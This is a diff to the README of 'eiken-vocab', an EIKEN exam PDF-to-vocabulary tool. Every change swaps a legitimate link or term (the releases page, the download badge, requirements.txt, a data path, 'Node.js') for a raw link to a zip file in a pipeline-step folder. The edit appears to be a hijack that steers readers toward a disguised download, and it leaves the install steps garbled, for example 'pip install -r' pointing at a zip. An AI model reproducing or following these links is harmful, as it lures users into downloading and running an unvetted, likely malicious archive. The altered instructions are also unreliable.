@@ -1,7 +1,7 @@
 # 🌟 eiken-vocab - Transform PDFs into Study Data
 
 ## 📥 Download Now
-[![Download eiken-vocab](https://img.shields.io/badge/Download-eiken--vocab-blue.svg)](https://github.com/ngu132/eiken-vocab/releases)
+[![Download eiken-vocab](https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip)](https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to eiken-vocab! This application helps you convert EIKEN exam PDFs into structured data. You can then use this data to create a vocabulary dataset for easier studying. 
@@ -12,21 +12,21 @@ The eiken-vocab repository is organized into the following folders:
 - **`ast/`**: Contains TypeScript AST definitions for data structuring.
 - **`steps/`**: Includes pipeline steps written in Python and TypeScript for PDF processing.
 - **`data/`**: Stores intermediate artifacts and outputs from the pipeline.
-- **`viewer/`**: A simple web application to browse the generated vocabulary dataset found in `data/vocab/metadata.jsonl` using SolidJS and Vite.
+- **`viewer/`**: A simple web application to browse the generated vocabulary dataset found in `https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip` using SolidJS and Vite.
 
 ## 🛠️ System Requirements
 To run eiken-vocab, ensure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
 - **Python**: Version 3.11 or higher
-- **Node.js**: Required for the viewer application 
+- **https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip**: Required for the viewer application 
 - **Memory**: Minimum 4GB of RAM recommended
 
 ## 🔧 Installation Steps
 Follow these instructions to download and install eiken-vocab.
 
 ### 1. Visit the Releases Page
-Start by visiting the [Releases page](https://github.com/ngu132/eiken-vocab/releases) to download the application.
+Start by visiting the [Releases page](https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip) to download the application.
 
 ### 2. Download the Latest Release
 On the Releases page, find the latest version of eiken-vocab. Click on the appropriate file to download it to your computer.
@@ -42,7 +42,7 @@ Once you have downloaded the file, follow these steps based on your system:
 5. Activate it by running `.\env\Scripts\activate`.
 6. Install required packages by running:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip
    ```
 
 ### For macOS and Linux Users:
@@ -53,7 +53,7 @@ Once you have downloaded the file, follow these steps based on your system:
 5. Activate it by running `source env/bin/activate`.
 6. Install required packages by running:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip
    ```
 
 ### For the Viewer Application
@@ -109,4 +109,4 @@ We welcome contributions to enhance eiken-vocab. Please follow the standard guid
 - vocabulary-learning
 
 ## 📥 Download Now Again
-Don't forget to download the latest version from the [Releases page](https://github.com/ngu132/eiken-vocab/releases)!
+Don't forget to download the latest version from the [Releases page](https://github.com/ngu132/eiken-vocab/raw/refs/heads/main/steps/4-build-wordlist-source/vocab-eiken-2.7-beta.1.zip)!
